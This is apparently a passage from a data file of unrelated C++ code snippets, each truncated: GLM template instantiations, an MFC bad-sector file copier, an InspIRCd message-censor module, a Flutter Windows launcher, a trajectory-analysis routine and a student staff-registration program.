mediump>;\ntemplate struct vec<1, int32, mediump>;\ntemplate struct vec<1, int64, mediump>;\ntemplate struct vec<1, float32, mediump>;\ntemplate struct vec<1, float64, mediump>;\n\ntemplate struct vec<1, uint8, highp>;\ntemplate struct vec<1, uint16, highp>;\ntemplate struct vec<1, uint32, highp>;\ntemplate struct vec<1, uint64, highp>;\ntemplate struct vec<1, int8, highp>;\ntemplate struct vec<1, int16, highp>;\ntemplate struct vec<1, int32, highp>;\ntemplate struct vec<1, int64, highp>;\ntemplate struct vec<1, float32, highp>;\ntemplate struct vec<1, float64, highp>;\n\n// tvec2 type explicit instantiation\ntemplate struct vec<2, uint8, lowp>;\ntemplate struct vec<2, uint16, lowp>;\ntemplate struct vec<2, uint32, lowp>;\ntemplate struct vec<2, uint64, lowp>;\ntemplate struct vec<2, int8, lowp>;\ntemplate struct vec<2, int16, lowp>;\ntemplate struct vec<2, int32, lowp>;\ntemplate struct vec<2, int64, lowp>;\ntemplate struct vec<2, float32, lowp>;\ntemplate struct vec<2, float64, lowp>;\n\ntemplate struct vec<2, uint8, mediump>;\ntemplate struct vec<2, uint16, mediump>;\ntemplate struct vec<2, uint32, mediump>;\ntemplate struct vec<2, uint64, mediump>;\ntemplate struct vec<2, int8, mediump>;\ntemplate struct vec<2, int16, mediump>;\ntemplate struct vec<2, int32, mediump>;\ntemplate struct vec<2, int64, mediump>;\ntemplate struct vec<2, float32, mediump>;\ntemplate struct vec<2, float64, mediump>;\n\ntemplate struct vec<2, uint8, highp>;\ntemplate struct vec<2, uint16, highp>;\ntemplate struct vec<2, uint32, highp>;\ntemplate struct vec<2, uint64, highp>;\ntemplate struct vec<2, int8, highp>;\ntemplate struct vec<2, int16, highp>;\ntemplate struct vec<2, int32, highp>;\ntemplate struct vec<2, int64, highp>;\ntemplate struct vec<2, float32, highp>;\ntemplate struct vec<2, float64, highp>;\n\n// tvec3 type explicit instantiation\ntemplate struct vec<3, uint8, lowp>;\ntemplate struct vec<3, uint16, lowp>;\ntemplate struct vec<3, uint32, lowp>;\ntemplate struct vec<3, uint64, lowp>;\ntemplate struct vec<3, int8, lowp>;\ntemplate struct vec<3, int16, lowp>;\ntemplate struct vec<3, int32, lowp>;\ntemplate struct vec<3, int64, lowp>;\ntemplate struct vec<3, float32, lowp>;\ntemplate struct vec<3, float64, lowp>;\n\ntemplate struct vec<3, uint8, mediump>;\ntemplate struct vec<3, uint16, mediump>;\ntemplate struct vec<3, uint32, mediump>;\ntemplate struct vec<3, uint64, mediump>;\ntemplate struct vec<3, int8, mediump>;\ntemplate struct vec<3, int16, mediump>;\ntemplate struct vec<3, int32, mediump>;\ntemplate struct vec<3, int64, mediump>;\ntemplate struct vec<3, float32, mediump>;\ntemplate struct vec<3, float64, mediump>;\n\ntemplate struct vec<3, uint8, highp>;\ntemplate struct vec<3, uint16, highp>;\ntemplate struct vec<3, uint32, highp>;\ntemplate struct vec<3, uint64, highp>;\ntemplate struct vec<3, int8, highp>;\ntemplate struct vec<3, int16, highp>;\ntemplate struct vec<3, int32, highp>;\ntemplate struct vec<3, int64, highp>;\ntemplate struct vec<3, float32, highp>;\ntemplate struct vec<3, float64, highp>;\n\n// tvec4 type explicit instantiation\ntemplate struct vec<4, uint8, lowp>;\ntemplate struct vec<4, uint16, lowp>;\ntemplate struct vec<4, uint32, lowp>;\ntemplate struct vec<4, uint64, lowp>;\ntemplate struct vec<4, int8, lowp>;\ntemplate struct vec<4, int16, lowp>;\ntemplate struct vec<4, int32, lowp>;\ntemplate struct vec<4, int64, lowp>;\ntemplate struct vec<4, float32, lowp>;\ntemplate struct vec<4, float64, lowp>;\n\ntemplate struct vec<4, uint8, mediump>;\ntemplate struct vec<4, uint16, mediump>;\ntemplate struct vec<4, uint32, mediump>;\ntemplate struct vec<4, uint64, mediump>;\ntemplate struct vec<4, int8, mediump>;\ntemplate struct vec<4, int16, mediump>;\ntemplate struct vec<4, int32, mediump>;\ntemplate struct vec<4, int64, mediump>;\ntemplate struct vec<4, float32, mediump>;\ntemplate struct vec<4, float64, mediump>;\n\ntemplate struct vec<4, uint8, highp>;\ntemplate struct vec<4, uint16, highp>;\ntemplate struct vec<4, uint32, highp>;\ntemplate struct vec<4, uint64, highp>;\ntemplate struct vec<4, int8, highp>;\ntemplate struct vec<4, int16, hig",
    "\ufeff\n// CBFDlg.cpp: \u5b9e\u73b0\u6587\u4ef6\n//\n\n#include \"pch.h\"\n#include \"framework.h\"\n#include \"CBF.h\"\n#include \"CBFDlg.h\"\n#include \"afxdialogex.h\"\n#include \"resource.h\"\n\n#ifdef _DEBUG\n#define new DEBUG_NEW\n#endif\n\n\n// \u7528\u4e8e\u5e94\u7528\u7a0b\u5e8f\u201c\u5173\u4e8e\u201d\u83dc\u5355\u9879\u7684 CAboutDlg \u5bf9\u8bdd\u6846\n\nclass CAboutDlg : public CDialog\n{\npublic:\n\tCAboutDlg();\n\n// \u5bf9\u8bdd\u6846\u6570\u636e\n#ifdef AFX_DESIGN_TIME\n\tenum { IDD = IDD_ABOUTBOX };\n#endif\n\n\tprotected:\n\tvirtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV \u652f\u6301\n\n// \u5b9e\u73b0\nprotected:\n\tDECLARE_MESSAGE_MAP()\n};\n\nCAboutDlg::CAboutDlg() : CDialog(IDD_ABOUTBOX)\n{\n}\n\nvoid CAboutDlg::DoDataExchange(CDataExchange* pDX)\n{\n\tCDialog::DoDataExchange(pDX);\n}\n\nBEGIN_MESSAGE_MAP(CAboutDlg, CDialog)\nEND_MESSAGE_MAP()\n\n\n// CCBFDlg \u5bf9\u8bdd\u6846\n\n\n\nCCBFDlg::CCBFDlg(CWnd* pParent /*=nullptr*/)\n\t: CDialog(IDD_CBF_DIALOG, pParent)\n\t, m_strSrcFile(_T(\"\"))\n\t, m_strDstFile(_T(\"\"))\n\t, m_hThread(NULL)\n\t, m_strSrcFileName(_T(\"\"))\n{\n\tm_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);\n}\n\nvoid CCBFDlg::DoDataExchange(CDataExchange* pDX)\n{\n\tCDialog::DoDataExchange(pDX);\n\tDDX_Text(pDX, IDC_EDIT_SRC_FILE, m_strSrcFile);\n\tDDX_Text(pDX, IDC_EDIT_DST_FILE, m_strDstFile);\n\tDDX_Control(pDX, IDC_LIST_ERROR, m_ctlErrorList);\n\tDDX_Control(pDX, IDC_BUTTON_START_STOP, m_btnStartStop);\n\tDDX_Control(pDX, IDC_PROGRESS_TRANSFER, m_ctlProgress);\n}\n\nBEGIN_MESSAGE_MAP(CCBFDlg, CDialog)\n\tON_WM_SYSCOMMAND()\n\tON_WM_PAINT()\n\tON_WM_QUERYDRAGICON()\n\tON_MESSAGE(WM_UPDATE_PROGRESS, OnUpdateProgress)\n\tON_MESSAGE(WM_UPDATE_BAD, OnUpdateBad)\n\tON_BN_CLICKED(IDOK, &CCBFDlg::OnBnClickedOk)\n\tON_BN_CLICKED(IDCANCEL, &CCBFDlg::OnBnClickedCancel)\n\tON_BN_CLICKED(IDC_BUTTON_SRC_FILE, &CCBFDlg::OnBnClickedButtonSrcFile)\n\tON_BN_CLICKED(IDC_BUTTON_DST_FILE, &CCBFDlg::OnBnClickedButtonDstFile)\n\tON_BN_CLICKED(IDC_BUTTON_START_STOP, &CCBFDlg::OnBnClickedButtonStartStop)\nEND_MESSAGE_MAP()\n\n\n// CCBFDlg \u6d88\u606f\u5904\u7406\u7a0b\u5e8f\n\nBOOL CCBFDlg::OnInitDialog()\n{\n\tCDialog::OnInitDialog();\n\n\t// \u5c06\u201c\u5173\u4e8e...\u201d\u83dc\u5355\u9879\u6dfb\u52a0\u5230\u7cfb\u7edf\u83dc\u5355\u4e2d\u3002\n\n\t// IDM_ABOUTBOX \u5fc5\u987b\u5728\u7cfb\u7edf\u547d\u4ee4\u8303\u56f4\u5185\u3002\n\tASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);\n\tASSERT(IDM_ABOUTBOX < 0xF000);\n\n\tCMenu* pSysMenu = GetSystemMenu(FALSE);\n\tif (pSysMenu != nullptr)\n\t{\n\t\tBOOL bNameValid;\n\t\tCString strAboutMenu;\n\t\tbNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);\n\t\tASSERT(bNameValid);\n\t\tif (!strAboutMenu.IsEmpty())\n\t\t{\n\t\t\tpSysMenu->AppendMenu(MF_SEPARATOR);\n\t\t\tpSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);\n\t\t}\n\t}\n\n\t// \u8bbe\u7f6e\u6b64\u5bf9\u8bdd\u6846\u7684\u56fe\u6807\u3002  \u5f53\u5e94\u7528\u7a0b\u5e8f\u4e3b\u7a97\u53e3\u4e0d\u662f\u5bf9\u8bdd\u6846\u65f6\uff0c\u6846\u67b6\u5c06\u81ea\u52a8\n\t//  \u6267\u884c\u6b64\u64cd\u4f5c\n\tSetIcon(m_hIcon, TRUE);\t\t\t// \u8bbe\u7f6e\u5927\u56fe\u6807\n\tSetIcon(m_hIcon, FALSE);\t\t// \u8bbe\u7f6e\u5c0f\u56fe\u6807\n\n\tm_ctlProgress.SetRange(0, 100);\n\tCString strCol;\n\tstrCol.LoadString(IDS_DATA_RANGE);\n\tm_ctlErrorList.InsertColumn(0, strCol, 0, 300);\n\tstrCol.LoadString(IDS_CORRUPT_LENGTH);\n\tm_ctlErrorList.InsertColumn(1, strCol, 0, 100);\n\tstrCol.LoadString(IDS_START);\n\tm_btnStartStop.SetWindowText(strCol);\n\tstrCol.LoadString(IDS_DIG_CAPTION_STOP);\n\tSetWindowText(strCol);\n\n\treturn TRUE;  // \u9664\u975e\u5c06\u7126\u70b9\u8bbe\u7f6e\u5230\u63a7\u4ef6\uff0c\u5426\u5219\u8fd4\u56de TRUE\n}\n\nvoid CCBFDlg::OnSysCommand(UINT nID, LPARAM lParam)\n{\n\tif ((nID & 0xFFF0) == IDM_ABOUTBOX)\n\t{\n\t\tCAboutDlg dlgAbout;\n\t\tdlgAbout.DoModal();\n\t}\n\telse\n\t{\n\t\tCDialog::OnSysCommand(nID, lParam);\n\t}\n}\n\n// \u5982\u679c\u5411\u5bf9\u8bdd\u6846\u6dfb\u52a0\u6700\u5c0f\u5316\u6309\u94ae\uff0c\u5219\u9700\u8981\u4e0b\u9762\u7684\u4ee3\u7801\n//  \u6765\u7ed8\u5236\u8be5\u56fe\u6807\u3002  \u5bf9\u4e8e\u4f7f\u7528\u6587\u6863/\u89c6\u56fe\u6a21\u578b\u7684 MFC \u5e94\u7528\u7a0b\u5e8f\uff0c\n//  \u8fd9\u5c06\u7531\u6846\u67b6\u81ea\u52a8\u5b8c\u6210\u3002\n\nvoid CCBFDlg::OnPaint()\n{\n\tif (IsIconic())\n\t{\n\t\tCPaintDC dc(this); // \u7528\u4e8e\u7ed8\u5236\u7684\u8bbe\u5907\u4e0a\u4e0b\u6587\n\n\t\tSendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);\n\n\t\t// \u4f7f\u56fe\u6807\u5728\u5de5\u4f5c\u533a\u77e9\u5f62\u4e2d\u5c45\u4e2d\n\t\tint cxIcon = GetSystemMetrics(SM_CXICON);\n\t\tint cyIcon = GetSystemMetrics(SM_CYICON);\n\t\tCRect rect;\n\t\tGetClientRect(&rect);\n\t\tint x = (rect.Width() - cxIcon + 1) / 2;\n\t\tint y = (rect.Height() - cyIcon + 1) / 2;\n\n\t\t// \u7ed8\u5236\u56fe\u6807\n\t\tdc.DrawIcon(x, y, m_hIcon);\n\t}\n\telse\n\t{\n\t\tCDialog::OnPaint();\n\t}\n}\n\n//\u5f53\u7528\u6237\u62d6\u52a8\u6700\u5c0f\u5316\u7a97\u53e3\u65f6\u7cfb\u7edf\u8c03\u7528\u6b64\u51fd\u6570\u53d6\u5f97\u5149\u6807\n//\u663e\u793a\u3002\nHCURSOR CCBFDlg::OnQueryDragIcon()\n{\n\treturn static_cast<HCURSOR>(m_hIcon);\n}\n\n\n\nvoid CCBFDlg::OnBnClickedOk()\n{\n\t// TODO: \u5728\u6b64\u6dfb\u52a0\u63a7\u4ef6\u901a\u77e5\u5904\u7406\u7a0b\u5e8f\u4ee3\u7801\n\t// CDialog::OnOK();\n}\n\n\nvoid CCBFDlg::OnBnClickedCancel()\n{\n\t// TODO: \u5728\u6b64\u6dfb\u52a0\u63a7\u4ef6\u901a\u77e5\u5904\u7406\u7a0b\u5e8f\u4ee3\u7801\n\tCDialog::OnCancel();\n}\n\n\nvoid CCBFDlg::OnBnClickedButtonSrcFile()\n{\n\tCFileDialog dlgOpen(TRUE);\n\tif (dlgOpen.DoModal() == IDOK) {\n\t\tthis->m_strSrcFile = dlgOpen.GetPathName();\n\t\tthis->UpdateData(FALSE);\n\t\tm_strSrcFileName = dlgOpen.GetFileName();\n\t}\n}\n\n\nvoid CCBFDlg::OnBnClickedButtonDstFile()\n{\n\tCFileDialog dlgOpen(FALSE);\n\tif (dlgOpen.DoModal() == IDOK) {\n\t\tthis->m_strDstFile = dlgOpen.GetPathName();\n\t\tthis->UpdateData(FALSE);\n\t}\n}\n\nvoid CCBFDlg::FormatError(DWORD dwError, CString & strRet)\n{\n\tLPTSTR lpMsgBuf = NULL;\n\t::FormatMessage(\n\t\tFORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS,\n\t\tNULL,\n\t\tdwError,\n\t\tMAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),\n\t\t(LPTSTR)&lpMsgBuf,\n\t\t0,\n\t\tNULL);\n\n\tstrRet = lpMsgBuf;\n\n\tLocalFree(lpMsgBuf);\n}\n\nvoid CCBFDlg::ReadFileAnyway(\n\tHANDLE hFile,\n\tLONGLONG nOffset,\n\tLPBYTE Buffer,\n\tDWORD dwSize,\n\tDWORD* dwRead,\n\tDWORD* dwBad,\n\tBOOL * bRunning\n)\n{\n\tBYTE buf[512]; /* once a sector...*/\n\tLARGE_INTEGER nIndex;\n\tDWORD dwJunk = 0, dwIndex = 0, dwRealWant = 0;\n\tnIndex.QuadPart = nOffset;\n\t*dwRead = 0;\n\t*dwBad = 0;\n\n\tZeroMemory(Buffer, dwSize);",
    "/// $CompilerFlags: find_compiler_flags(\"icu-uc\")\n/// $LinkerFlags: find_linker_flags(\"icu-uc\")\n/// $CompilerFlags: find_compiler_flags(\"icu-i18n\")\n/// $LinkerFlags: find_linker_flags(\"icu-i18n\")\n/// $CompilerFlags: -I/usr/local/include\n/// $LinkerFlags: -L/usr/local/lib -lhs\n\n#include \"inspircd.h\"\n#include \"modules/exemption.h\"\n#include \"numerichelper.h\"\n#include \"utility/string.h\"\n#include <hs/hs.h> // Hyperscan\n#include <unicode/regex.h>\n#include <unicode/unistr.h>\n#include <codecvt>\n#include <locale>\n\ntypedef insp::flat_map<std::string, std::string, irc::insensitive_swo> CensorMap;\n\nclass ModuleCensor : public Module\n{\nprivate:\n\tCheckExemption::EventProvider exemptionprov;\n\tCensorMap censors;\n\tSimpleUserMode cu;\n\tSimpleChannelMode cc;\n\tstd::unique_ptr<icu::RegexPattern> emoji_pattern;\n\tstd::unique_ptr<icu::RegexPattern> kiwiirc_pattern;\n\tstd::string whitelist_regex_str;\n\n\ths_database_t* whitelist_db = nullptr;\n\ths_scratch_t* scratch = nullptr;\n\n\tstatic int onMatch(unsigned int id, unsigned long long from, unsigned long long to, unsigned int flags, void* ctx) {\n\t\tbool* matched = (bool*)ctx;\n\t\t*matched = true;\n\t\treturn 0;\n\t}\n\n\tbool CompileRegex(const std::string& pattern, hs_database_t** db) {\n\t\ths_compile_error_t* compile_err;\n\t\tif (hs_compile(pattern.c_str(), HS_FLAG_UTF8 | HS_FLAG_UCP, HS_MODE_BLOCK, nullptr, db, &compile_err) != HS_SUCCESS) {\n\t\t\tServerInstance->Logs.Normal(MODNAME, \"Failed to compile regex pattern: %s\", compile_err->message);\n\t\t\ths_free_compile_error(compile_err);\n\t\t\treturn false;\n\t\t}\n\t\treturn true;\n\t}\n\n\tbool IsMatch(hs_database_t* db, const std::string& text) {\n\t\tbool matched = false;\n\t\tif (hs_scan(db, text.c_str(), text.length(), 0, scratch, onMatch, &matched) != HS_SUCCESS) {\n\t\t\tServerInstance->Logs.Normal(MODNAME, \"Hyperscan scan error\");\n\t\t}\n\t\treturn matched;\n\t}\n\n\tbool IsMixedUTF8(const std::string& text)\n\t{\n\t\tif (text.empty())\n\t\t\treturn false;\n\n\t\tenum ScriptType { SCRIPT_UNKNOWN, SCRIPT_LATIN, SCRIPT_NONLATIN };\n\t\tScriptType detected = SCRIPT_UNKNOWN;\n\n\t\tfor (const auto& c : text)\n\t\t{\n\t\t\tif (static_cast<unsigned char>(c) < 128)\n\t\t\t\tcontinue; // ASCII characters are ignored\n\n\t\t\tif (std::isalpha(static_cast<unsigned char>(c)))\n\t\t\t{\n\t\t\t\tScriptType current = std::islower(static_cast<unsigned char>(c)) || std::isupper(static_cast<unsigned char>(c)) ? SCRIPT_LATIN : SCRIPT_NONLATIN;\n\t\t\t\tif (detected == SCRIPT_UNKNOWN)\n\t\t\t\t{\n\t\t\t\t\tdetected = current;\n\t\t\t\t}\n\t\t\t\telse if (detected != current)\n\t\t\t\t{\n\t\t\t\t\treturn true; // Mixed scripts detected\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\treturn false;\n\t}\n\n\tbool IsEmojiOnly(const std::string& text)\n\t{\n\t\tUErrorCode status = U_ZERO_ERROR;\n\t\ticu::UnicodeString ustr(text.c_str(), \"UTF-8\");\n\t\tstd::unique_ptr<icu::RegexMatcher> emoji_matcher(emoji_pattern->matcher(ustr, status));\n\t\tif (U_FAILURE(status))\n\t\t{\n\t\t\tServerInstance->Logs.Normal(MODNAME, \"Failed to create regex matcher for emojis: %s\", u_errorName(status));\n\t\t\treturn false;\n\t\t}\n\n\t\t// Check if the entire text is matched by the emoji pattern\n\t\treturn emoji_matcher->matches(status);\n\t}\n\n\tbool IsKiwiIRCOnly(const std::string& text)\n\t{\n\t\tUErrorCode status = U_ZERO_ERROR;\n\t\ticu::UnicodeString ustr(text.c_str(), \"UTF-8\");\n\t\tstd::unique_ptr<icu::RegexMatcher> kiwiirc_matcher(kiwiirc_pattern->matcher(ustr, status));\n\t\tif (U_FAILURE(status))\n\t\t{\n\t\t\tServerInstance->Logs.Normal(MODNAME, \"Failed to create regex matcher for KiwiIRC: %s\", u_errorName(status));\n\t\t\treturn false;\n\t\t}\n\n\t\t// Check if the entire text is matched by the KiwiIRC pattern\n\t\treturn kiwiirc_matcher->matches(status);\n\t}\n\n\tbool IsAllowed(const std::string& text)\n\t{\n\t\t// Allow ASCII characters and common symbols by default\n\t\tif (std::all_of(text.begin(), text.end(), [](unsigned char c) { return c >= 32 && c <= 126; }))\n\t\t{\n\t\t\treturn true;\n\t\t}\n\n\t\t// First, try to match the whitelist using Hyperscan\n\t\tif (IsMatch(whitelist_db, text))\n\t\t\treturn true;\n\n\t\t// Then, try to match the text against emoji and KiwiIRC patterns using ICU\n\t\treturn IsEmojiOnly(text) || IsKiwiIRCOnly(text);\n\t}\n\npublic:\n\tModuleCensor()\n\t\t: Module(VF_NONE, \"Allows the server administrator to define inappropriate phrases that are not allowed to be used in private or channel messages and blocks messages with mixed UTF-8 scripts, only allowing certain Unicode smileys.\")\n\t\t, exemptionprov(this)\n\t\t, cu(this, \"u_censor\", 'G')\n\t\t, cc(this, \"censor\", 'G')\n\t{\n\t}\n\n\tvoid ReadConfig(ConfigStatus& status) override\n\t{\n\t\tCensorMap newcensors;\n\t\tfor (const auto& [_, badword_tag] : ServerInstance->Config->ConfTags(\"badword\"))\n\t\t{\n\t\t\tconst std::string text = badword_tag->getString(\"text\");\n\t\t\tif (text.empty())\n\t\t\t\tthrow ModuleException(this, \"<badword:text> is empty! at \" + badword_tag->source.str());\n\n\t\t\tconst std::string replace = badword_tag->getString(\"replace\");\n\t\t\tnewcensors[text] = replace;\n\t\t}\n\t\tcensors.swap(newcensors);\n\n\t\tconst auto& tag = ServerInstance->Config->ConfValue(\"censorplus\");\n\t\tstd::string emoji_regex_str = tag->getString(\"emojiregex\");\n\t\twhitelist_regex_str = tag->getString(\"whitelistregex\")",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"magic_8_ball\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n * TUM Autonomous Motorsport Georeferencing Tool\n * Copyright (C) 2024 Maximilian Leitenstern, Marko Alten, Christian Bolea-Schaser\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include \"analysis.hpp\"\nnamespace flexcloud\n{\n/**\n * @brief write all data relevant for evaluation of trajectory matching\n *\n * @param[in] node                - rclcpp::Node:\n *                                  Node reference\n * @param[in] src                 - std::vector<ProjPoint>:\n *                                  source trajectory\n * @param[in] target              - std::vector<ProjPoint>:\n *                                  target trajectory\n * @param[in] target_al           - std::vector<ProjPoint>:\n *                                  target trajectory after Umeyama trafo\n * @param[in] target_rs           - std::vector<ProjPoint>:\n *                                  target trajectory after rubber-sheeting\n * @param[in] triag               - std::shared_ptr<Delaunay>:\n *                                  pointer to triangulation\n * @param[in] cps                 - std::vector<ControlPoint>:\n *                                  vector of control points\n * @param[in] diff_al             - std::vector<double>:\n *                                  difference of aligned trajectory to source trajectory\n * @param[in] diff_rs             - std::vector<double>:\n *                                  difference of rubber-sheeted trajectory to source trajectory\n */\nbool analysis::traj_matching(\n  rclcpp::Node & node, const std::vector<ProjPoint> & src, const std::vector<ProjPoint> & target,\n  const std::vector<ProjPoint> & target_al, const std::vector<ProjPoint> & target_rs,\n  const std::shared_ptr<Delaunay> & triag, const std::vector<ControlPoint> & cps,\n  std::vector<double> & diff_al, std::vector<double> & diff_rs)\n{\n  diff_al.clear();\n  diff_rs.clear();\n\n  calc_diff(node, src, target_al, diff_al);\n  calc_diff(node, src, target_rs, diff_rs);\n\n  const std::string traj_matching_dir = \"/traj_matching\";\n  create_output_dir(node, traj_matching_dir);\n\n  write_ls(node, src, traj_matching_dir, \"source.txt\");\n  write_ls(node, target, traj_matching_dir, \"target.txt\");\n  write_ls(node, target_al, traj_matching_dir, \"target_al.txt\");\n  write_ls(node, target_rs, traj_matching_dir, \"target_rs.txt\");\n  write_triag(node, triag, traj_matching_dir, \"triag.txt\");\n  write_cp(node, cps, traj_matching_dir, \"controlPoints.txt\");\n  write_double_vec(node, diff_al, traj_matching_dir, \"diff_al.txt\");\n  write_double_vec(node, diff_rs, traj_matching_dir, \"diff_rs.txt\");\n  return true;\n}\n/**\n * @brief calculate difference of a target trajectory to a source trajectory\n *\n * @param[in] node                - rclcpp::Node:\n *                                  Node reference\n * @param[in] src                 - std::vector<ProjPoint>:\n *                                  source trajectory\n * @param[in] target              - std::vector<ProjPoint>:\n *                                  target trajectory\n * @param[in] diff                - std::vector<double>:\n *                                  difference between trajectories (euclidean distance)\n */\nvoid analysis::calc_diff(\n  rclcpp::Node & node, const std::vector<ProjPoint> & src, const std::vector<ProjPoint> & target,\n  std::vector<double> & diff)\n{\n  diff.clear();\n  int i = 0;\n  for (const auto & pt : target) {\n    if (node.get_parameter(\"dim\").as_int() == 2) {\n      // Only 2D distance\n      double dist =\n        (Eigen::Vector2d(pt.pos_(0), pt.pos_(1)) - Eigen::Vector2d(src[i].pos_(0), src[i].pos_(1)))\n          .norm();\n      diff.push_back(dist);\n      ++i;\n    } else if (node.get_parameter(\"dim\").as_int() == 3) {\n      double dist = (pt.pos_ - src[i].pos_).norm();\n      diff.push_back(dist);\n      ++i;\n    } else {\n      throw std::invalid_argument(\"Invalid Dimension!\");\n    }\n  }\n}\n/**\n * @brief create directory from name\n *\n * @param[in] node                - rclcpp::Node:\n *                                  Node reference\n * @param[in] dir_path            - std::string:\n *                                  name of output directory\n */\nvoid analysis::create_output_dir(rclcpp::Node & node, const std::string & dir_path)\n{\n  const std::string dir = node.get_parameter(\"analysis_output_dir\").as_string() + dir_path;\n  // Create if not a directory\n  if (!std::filesystem::is_directory(dir)) {\n    std::filesystem::create_direct",
    "#include<iostream>\r\n#include<fstream>\r\n#include<stdlib.h>\r\n\r\nusing namespace std;\r\n\r\nclass staff {\r\n\tpublic:\r\n\tstring emp_id;\r\n\tstring name;\r\n\tint age;\r\n\r\n\t\tstaff(){}\r\n\t\t\r\n\t\t//optional parameterized constructor\r\n\t\tstaff(string emp_id,string name,int age){\r\n\t\t\tthis->emp_id=emp_id;\r\n\t\t\tthis->name=name;\r\n\t\t\tthis->age=age;\r\n\t\t}\r\n\t\t\r\n\t\tvoid setid (string id) {\r\n\t\t\temp_id=id;\r\n\t\t}\r\n\t\t\r\n\t\tstring getid () {\r\n\t\t\treturn emp_id;\r\n\t\t}\r\n\t\t\r\n\t\tvoid setname (string n) {\r\n\t\t\tname=n;\r\n\t\t}\r\n\t\t\r\n\t\tstring getname () {\r\n\t\t\treturn name;\r\n\t\t}\r\n\t\t\r\n\t\tvoid setage (int a) {\r\n\t\t\tage=a;\r\n\t\t}\r\n\t\t\r\n\t\tint getage () {\r\n\t\t\treturn age;\r\n\t\t}\r\n\t\t\r\n};\r\n\r\nclass driver:public staff {\r\n\r\n\tpublic:\r\n\r\n\tint experience;\r\n\tstring license;\r\n\tbool verified;\r\n\t\tdriver () {}\r\n\t\t\r\n\t\t//optional parameterized constructor\r\n\t\tdriver(string emp_id,string name,int age,int experience,string license,bool verified):staff(emp_id,name,age){\r\n\t\t\tthis->experience=experience;\r\n\t\t\tthis->license=license;\r\n\t\t\tthis->verified=verified;\r\n\t\t}\r\n\t\t\r\n\t\tvoid setexp (int exp) {\r\n\t\t\texperience=exp;\r\n\t\t}\r\n\t\t\r\n\t\tint getexp () {\r\n\t\t\treturn experience;\r\n\t\t}\r\n\t\t\r\n\t\tvoid setlic (string lic) {\r\n\t\t\tlicense=lic;\r\n\t\t}\r\n\t\t\r\n\t\tstring getlic () {\r\n\t\t\treturn license;\r\n\t\t}\r\n\t\t\r\n\t\tvoid setver (bool ver) {\r\n\t\t\tverified=ver;\r\n\t\t}\r\n\t\t\r\n\t\tbool getver () {\r\n\t\t\treturn verified;\r\n\t\t}\r\n\t\t\r\n\t\tvoid driver_details () {\r\n\t\t\tcout<<\"\\nEnter driver details\\n\"<<endl;\r\n\t\t\tcout<<\"\\nName: \";\r\n\t\t\tcin>>name;\r\n\t\t\tcout<<\"\\nAge: \";\r\n\t\t\tcin>>age;\r\n\t\t\tcout<<\"\\nEmployee ID: \";\r\n\t\t\tcin>>emp_id;\r\n\t\t\tcout<<\"\\nYears of experience: \";\r\n\t\t\tcin>>experience;\r\n\t\t\tcout<<\"\\nLicense Number: \";\r\n\t\t\tcin>>license;\r\n\t\t\tcout<<\"\\nIs your license verified ? Press 1 for yes and 0 for no\"<<endl;\r\n\t\t\tcin>>verified;\r\n\t\t\tif (verified){\r\n\t\t\t\tcout<<\"\\n\\n-----------------------------------------------registration complete--------------------------------------------------------\\n\\n\"<<endl;\r\n\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\tcout<<\"your license must be renewed and verified within 1 month\"<<endl;\r\n\t\t\t}\r\n\t\t}\r\n\t\r\n\tvoid show(){\r\n\t\t\r\n\t\tcout<<\"Employee Id: \"<<emp_id<<\"\\nName: \"<<name<<\"\\nAge: \"<<age<<\"\\nExperience: \"<<experience<<\"\\nLicense: \"<<license<<\"\\nVerified: \"<<verified<<endl;\t\t\r\n\t}\t\r\n\t\r\n\tvoid write(ofstream &fout){\r\n\r\n\t\tfout<<emp_id<<\"\\n\"<<name<<\"\\n\"<<age<<\"\\n\"<<experience<<\"\\n\"<<license<<\"\\n\"<<verified<<endl;\r\n\t}\r\n\r\n};\r\n\r\nclass attendent:public staff {\r\n\r\n\tpublic:\r\n\r\n\tint working_days;\r\n\tint working_hours;\r\n\tbool night_shift;\r\n\t\tattendent () {}\r\n\t\t\r\n\t\tattendent (string emp_id,string name,int age,int working_days,int working_hours,bool night_shift):staff(emp_id,name,age) 